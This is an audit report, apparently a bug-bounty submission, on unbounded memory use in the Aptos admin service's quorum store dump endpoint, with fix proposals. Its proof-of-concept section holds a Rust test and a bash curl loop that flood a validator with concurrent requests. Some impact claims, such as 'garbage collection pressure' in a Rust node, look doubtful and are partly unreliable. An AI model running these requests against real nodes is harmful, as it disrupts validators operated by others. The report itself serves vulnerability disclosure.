# Audit Report

## Title
Unbounded Iteration in Quorum Store Database Dump Causes Memory Exhaustion on Admin Service Endpoint

## Summary
The admin service endpoint `/debug/consensus/quorumstoredb` calls `get_all_batches()` which iterates over the entire quorum store database without pagination limits, loading all batch entries into memory. On testnet/devnet deployments where authentication is not required, or on mainnet with compromised credentials, attackers can trigger memory exhaustion by forcing enumeration of up to 300,000 batches, potentially consuming hundreds of megabytes to gigabytes of memory per request.

## Finding Description

The vulnerability exists in the interaction between three components:

**1. Admin Service Request Handler** [1](#0-0) 

The `/debug/consensus/quorumstoredb` endpoint is exposed and calls `handle_dump_quorum_store_db_request()`.

**2. Dump Function with Unbounded Iteration** [2](#0-1) 

The `dump_quorum_store_db()` function at line 171 calls `get_all_batches()` without any pagination parameter, iterating over all batches to format their digests.

**3. Database Query Without Pagination** [3](#0-2) 

The `get_all_batches()` implementation creates a database iterator, seeks to the first element, and collects ALL entries into a `HashMap<HashValue, PersistedValue<BatchInfo>>` in memory. There is no pagination, limit, or streaming mechanism.

**4. Data Structure with Potential Payload** [4](#0-3) 

Each `PersistedValue<T>` contains the batch metadata plus an optional transaction payload (`Option<Vec<SignedTransaction>>`), which can consume substantial memory.

**5. Batch Quota Configuration** [5](#0-4) 

The system allows up to 300,000 batches to accumulate before hitting the `batch_quota` limit.

**6. Authentication Bypass on Non-Mainnet** [6](#0-5) 

If `authentication_configs` is empty (allowed on testnet/devnet), all requests are automatically authenticated. [7](#0-6) 

The configuration sanitizer only enforces authentication on mainnet, allowing testnet/devnet deployments to run without authentication.

**Attack Scenario:**

1. **On Testnet/Devnet:** Attacker identifies a validator node with admin service enabled (default on non-mainnet chains per optimizer at lines 93-103 in admin_service_config.rs)

2. Attacker sends HTTP GET requests to: `http://validator:9102/debug/consensus/quorumstoredb`

3. Each request triggers `get_all_batches()` which:
   - Creates a database iterator over BatchSchema
   - Collects all entries into a HashMap in memory
   - With 300,000 batches potentially containing transaction payloads, each request allocates hundreds of MB to potentially GBs

4. Multiple concurrent requests rapidly exhaust available memory

5. Validator node experiences memory pressure, slowdowns, or OOM crashes

**On Mainnet:** While authentication is required, this vulnerability still exists if:
- Operator credentials are compromised
- Malicious or negligent operator triggers the endpoint repeatedly
- Multiple legitimate operators unknowingly trigger it simultaneously

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos Bug Bounty criteria:

- **"Validator node slowdowns"**: Direct match - memory exhaustion causes garbage collection pressure and CPU contention, degrading validator performance
- **"API crashes"**: Potential outcome if memory exhaustion triggers OOM killer

The vulnerability breaks **Critical Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits."

**Quantified Impact:**
- Up to 300,000 batches can be loaded into memory per request
- Each batch metadata: ~132 bytes (HashValue: 32 bytes + BatchInfo: ~100 bytes)
- If payloads are stored: up to 1MB per batch (sender_max_batch_bytes)
- Worst case memory consumption per request: 300,000 × 1MB = ~300 GB
- Realistic case (metadata only): 300,000 × 132 bytes ≈ 40 MB for HashMap + overhead
- String formatting output: 300,000 digests × ~70 chars ≈ 21 MB

Even the "realistic" case of 40-60 MB per request becomes problematic when:
- Multiple concurrent requests are issued
- The spawn_blocking thread pool spawns multiple threads
- Each thread allocates its own memory for the HashMap

## Likelihood Explanation

**Testnet/Devnet: HIGH**
- No authentication required by default
- Admin service enabled by default on non-mainnet chains
- Attack complexity: LOW (simple HTTP GET requests)
- Attacker privileges: NONE required
- Detection difficulty: MEDIUM (may appear as legitimate debugging activity)

**Mainnet: MEDIUM**
- Authentication required via passcode
- But credentials can be compromised or misused
- Legitimate operators may accidentally trigger mass memory consumption
- No rate limiting provides no defense against credential misuse

**Overall Assessment:** This is a realistic, easily exploitable vulnerability on testnet/devnet infrastructure, with residual risk on mainnet.

## Recommendation

Implement pagination for the database dump endpoint:

**Proposed Fix:**

1. Add pagination parameters to the endpoint:
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
    limit: Option<usize>,
    offset: Option<usize>,
) -> anyhow::Result<String>
```

2. Implement paginated database iteration in `QuorumStoreStorage` trait:
```rust
fn get_batches_paginated(
    &self,
    limit: usize,
    offset: usize,
) -> Result<Vec<(HashValue, PersistedValue<BatchInfo>)>>;
```

3. Use iterator with take/skip instead of collecting all:
```rust
let mut iter = self.db.iter::<BatchSchema>()?;
iter.seek_to_first();
let batches: Vec<_> = iter
    .skip(offset)
    .take(limit.min(1000)) // Hard cap at 1000 entries per request
    .collect::<Result<Vec<_>>>()?;
```

4. Add rate limiting to admin service endpoints using existing `aptos-rate-limiter` crate

5. Enforce maximum response size limits (e.g., 10 MB) and return HTTP 413 if exceeded

6. Consider requiring authentication on all deployments, not just mainnet

## Proof of Concept

**Rust-based HTTP test demonstrating the vulnerability:**

```rust
use hyper::{Client, Uri};
use std::time::Instant;

#[tokio::test]
async fn test_unbounded_quorum_store_dump_memory_exhaustion() {
    // Prerequisites:
    // 1. Testnet/devnet validator node running with admin service enabled
    // 2. Quorum store database populated with batches
    
    let admin_service_url = "http://127.0.0.1:9102/debug/consensus/quorumstoredb";
    let client = Client::new();
    
    // Track memory usage before attack
    let start_time = Instant::now();
    
    // Simulate attacker sending concurrent requests
    let mut handles = vec![];
    for i in 0..10 {
        let client = client.clone();
        let url: Uri = admin_service_url.parse().unwrap();
        
        let handle = tokio::spawn(async move {
            println!("Request {} started", i);
            let start = Instant::now();
            
            match client.get(url).await {
                Ok(resp) => {
                    let status = resp.status();
                    let body = hyper::body::to_bytes(resp.into_body()).await.unwrap();
                    let duration = start.elapsed();
                    
                    println!(
                        "Request {} completed: status={}, body_size={} bytes, duration={:?}",
                        i, status, body.len(), duration
                    );
                },
                Err(e) => {
                    println!("Request {} failed: {:?}", i, e);
                }
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests to complete
    for handle in handles {
        handle.await.unwrap();
    }
    
    println!("Total attack duration: {:?}", start_time.elapsed());
    
    // Expected outcome:
    // - Each request loads entire quorum store DB into memory
    // - With 10 concurrent requests and 300k batches, memory usage spikes significantly
    // - Node may experience slowdowns, increased GC pressure, or OOM
    // - Response times increase due to memory contention
}
```

**Command-line attack simulation:**
```bash
# Send 10 concurrent requests to testnet validator
for i in {1..10}; do
  curl -v "http://testnet-validator:9102/debug/consensus/quorumstoredb" &
done

# Monitor validator memory usage
watch -n 1 'ps aux | grep aptos-node | grep -v grep | awk "{print \$6/1024 \" MB\"}"'
```

**Expected Results:**
- Memory consumption increases by 40-300 MB per concurrent request
- With 10+ concurrent requests, total memory increase of 400MB - 3GB
- Validator node experiences increased CPU usage (GC pressure)
- Response times degrade due to memory allocation overhead
- In extreme cases with many batches and concurrent requests, node may crash with OOM error

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-157)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L205-214)
```rust
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** consensus/src/quorum_store/quorum_store_db.rs (L103-108)
```rust
    fn get_all_batches(&self) -> Result<HashMap<HashValue, PersistedValue<BatchInfo>>> {
        let mut iter = self.db.iter::<BatchSchema>()?;
        iter.seek_to_first();
        iter.map(|res| res.map_err(Into::into))
            .collect::<Result<HashMap<HashValue, PersistedValue<BatchInfo>>>>()
    }
```

**File:** consensus/src/quorum_store/types.rs (L21-25)
```rust
#[derive(Clone, Eq, Deserialize, Serialize, PartialEq, Debug)]
pub struct PersistedValue<T> {
    info: T,
    maybe_payload: Option<Vec<SignedTransaction>>,
}
```

**File:** config/src/config/quorum_store_config.rs (L135-135)
```rust
            batch_quota: 300_000,
```

**File:** config/src/config/admin_service_config.rs (L69-76)
```rust
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
```
